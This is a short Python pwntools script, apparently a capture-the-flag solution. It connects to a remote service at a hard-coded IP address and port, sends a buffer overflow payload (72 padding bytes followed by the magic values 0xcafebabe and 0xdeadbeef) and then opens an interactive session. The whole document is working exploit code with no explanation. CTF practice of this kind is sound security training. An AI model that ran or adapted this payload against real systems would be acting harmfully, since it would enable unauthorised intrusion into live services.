from pwn import *
c=remote('139.59.30.165','8800')
c.sendline('i'*72+'\xbe\xba\xfe\xca\xef\xbe\xad\xde')
c.interactive()


